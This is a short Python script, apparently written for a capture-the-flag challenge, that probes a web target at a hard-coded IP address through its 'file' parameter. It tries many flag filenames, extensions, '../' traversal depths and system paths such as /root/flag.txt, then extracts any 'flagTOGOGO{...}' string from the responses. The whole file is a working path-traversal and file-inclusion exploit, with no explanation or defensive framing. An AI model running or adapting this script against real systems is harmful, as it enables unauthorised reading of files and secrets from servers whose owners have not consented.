#!/usr/bin/env python3
import requests
import re

target = "http://47.113.178.182:32826/"

# 超全面的flag位置列表
paths = []

# 根目录的各种变体
for name in ['flag', 'Flag', 'FLAG', 'fl4g', 'f1ag', 'secret', 'key']:
    for ext in ['', '.txt', '.php', '.html', '.secret', '.data']:
        paths.append(f'/{name}{ext}')
        paths.append(f'/../{name}{ext}')
        paths.append(f'/../../{name}{ext}')
        paths.append(f'/../../../{name}{ext}')
        paths.append(f'/../../../../{name}{ext}')

# 特殊路径
special = [
    '/var/flag', '/var/www/flag', '/var/www/html/flag',
    '/tmp/flag', '/tmp/flag.txt',
    '/home/flag', '/home/ctf/flag',
    '/root/flag.txt',
    '/flagaa', '/flagbb', '/flagcc',
    'flag', '../flag', '../../flag',
]
paths.extend(special)

print(f"[*] 测试 {len(paths)} 个路径...")

for path in paths:
    try:
        r = requests.get(target, params={'file': path}, timeout=3)
        if 'flagTOGOGO{' in r.text:
            print(f"\n[+] 找到FLAG!")
            print(f"[+] 路径: {path}")
            flags = re.findall(r'flagTOGOGO\{[^}]+\}', r.text)
            if flags:
                print(f"[+] FLAG: {flags[0]}")
                break
    except:
        pass
else:
    print("\n[!] 未找到flag，尝试其他方法...")
